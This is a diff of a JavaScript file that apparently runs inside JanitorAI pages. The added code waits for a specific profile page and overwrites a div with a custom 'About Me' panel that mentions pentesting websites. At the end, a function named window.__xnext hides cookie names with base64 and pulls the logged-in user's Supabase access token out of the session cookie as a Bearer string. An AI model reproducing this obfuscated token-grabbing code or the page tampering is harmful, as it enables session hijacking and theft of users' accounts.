@@ -27,6 +27,92 @@ const intervalId = setInterval(() => {
     }
 }, checkInterval);
 
+let targetDiv2 = null;
+
+function findDivWithText() {
+    const divs = document.querySelectorAll('div');
+    for (let i = 0; i < divs.length; i++) {
+        if (divs[i].innerText === "Public characters\n\n1 characters\n\nLatest\n1" && window.location.href.includes("7a1053de-a29c-4416-8b91-0e86bdc42e0b")) {
+            return divs[i];
+        }
+    }
+    return null;
+}
+
+const intervalId2 = setInterval(() => {
+    targetDiv = findDivWithText();
+    if (targetDiv) {
+        clearInterval(intervalId2);
+        targetDiv.innerHTML=`<div style="
+    position: absolute;
+    top: 0px;
+    left: 0px;
+    right: 0px;
+    bottom: 0px;
+    z-index: 0;
+"><div style="position: absolute; inset: -1px; border-radius: 8px; width: calc(100% + 2px); height: calc(100% + 2px); background: linear-gradient(140deg, rgb(153, 153, 153) 0%, rgb(51, 51, 51) 20%, rgba(51, 51, 51, 0.9) 90%, rgb(153, 153, 153) 100%); pointer-events: none;"></div><div style="
+    position: absolute;
+    width: var(--chakra-sizes-full);
+    height: var(--chakra-sizes-full);
+    overflow: hidden;
+    border-radius: 8px;
+    left: 0px;
+    top: 0px;
+    pointer-events: none;
+    background: rgba(0, 0, 0, 0.84);
+"></div><div style="
+    position: absolute;
+    width: var(--chakra-sizes-full);
+    height: var(--chakra-sizes-full);
+    overflow: hidden;
+    left: 0px;
+    top: 0px;
+    border-radius: 8px;
+    pointer-events: none;
+    background: linear-gradient(141deg, rgba(26, 26, 26, 0.8) 12.3558%, rgba(26, 26, 26, 0.32) 36.8364%, rgba(51, 51, 51, 0.46) 80.13%, rgba(153, 153, 153, 0.14) 100%);
+"></div></div>
+<div style="
+    margin-bottom: var(--chakra-space-4);
+    flex-wrap: wrap;
+    align-items: center;
+    -webkit-box-align: center;
+    gap: var(--chakra-space-2);
+    -webkit-box-pack: justify;
+"><div style="
+    position: relative;
+    z-index: 1;
+"><h2 class="chakra-heading" style="
+    font-size: var(--chakra-fontSizes-4xl);
+    line-height: 1.2;
+    width: var(--chakra-sizes-full);
+    font-family: var(--chakra-fonts-heading);
+    font-weight: var(--chakra-fontWeights-bold);
+    margin-inline-end: var(--chakra-space-5);
+    margin-top: var(--chakra-space-2);
+    margin-bottom: var(--chakra-space-2);
+    color: #ffffff;
+    margin-inline-start: var(--chakra-space-5);
+">About Me</h2></div></div><div style="
+    font-family: var(--chakra-fonts-heading);
+    font-weight: var(--chakra-fontWeights-bold);
+    font-size: x-large;
+    z-index: 50;
+    position: relative;
+    margin-left: 25px;
+    top: -1px;
+">I'm VT, a near-beginner programmer working with JavaScript (HTML, CSS), C++, and LUA.<br><br>I also pentest websites for fun when I'm bored.</div><div style="
+    font-family: var(--chakra-fonts-heading);
+    font-weight: var(--chakra-fontWeights-bold);
+    font-size: x-large;
+    z-index: 50;
+    position: relative;
+    margin-left: 25px;
+    bottom: -90%;
+    left: -19%;
+">This user has voluntarily revoked their access to uploading characters to <a href="https://janitorai.com">JanitorAI</a></div>`;
+    }
+}, checkInterval);
+
 window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
 return z+t[zz]}
 
